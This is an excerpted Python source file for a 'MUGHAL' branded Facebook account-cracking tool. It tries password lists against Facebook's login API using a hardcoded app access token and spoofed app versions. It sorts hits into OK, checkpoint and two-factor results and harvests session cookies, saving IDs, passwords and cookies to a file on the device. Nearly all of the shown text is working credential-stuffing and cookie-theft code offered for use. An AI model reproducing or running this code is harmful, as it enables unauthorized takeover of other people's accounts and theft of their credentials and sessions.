...
def clr():
    try:
        ...
        if 'Android' in data:
            print(' \033[1;32m[!] DONT TRY AGAIN ITS MUGHAL BRAND ');exit()
        else:exit()
    except:exit()
####### MODULES KILLER #######
...
\033[1;39m━▷ \033[0;92m𝙏𝙀𝘼𝙈     \033[1;39m◈✙◈\033[1;31m TEAM OF MUGHAL
...
def approval():
  ...
  try:
    ...
    if realid in httpCaht:
      ...
      print('\33[1;37m ====================================================')
      print (" \33[37;41m\t WELCOME TO MUGHAL TOOL AND ENJOY \33[0;m")
...
def ffb(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m[MUGHAL-XD-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m[MUGHAL-XD-OK] '+ids+' [√] '+pas+'\033[1;97m'+' | '+Jawnx(uid)+' ')
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m [ALONE-MUGHAL-CP] '+ids+' [√] '+pas+'\033[1;97m'+' | '+Jawnx(uid)+' ')
...
def api(ids,names,passlist):
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m[MUGHAL-XD-OK] '+str(uid)+' [√] '+pas+'\033[1;97m'+' | '+Jawnx(uid)+' ')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[MUGHAL-2F] '+ids+' [√] '+pas+' | '+Jawnx(uid)+' ')
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
...
def api1(ids,names,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [MUGHAL-XD-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        ...
                        if 'session_key' in po:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[1;31m [ALONE-MUGHAL-CP] '+str(uid)+' [√] '+pas+'\033[1;97m'+' | '+Jawnx(uid)+' ')
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("\r\r\033[1;33m [🍪Cookie:]"+coki)                                                                                                               
                                        open('/sdcard/MUGHAL-rnd-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
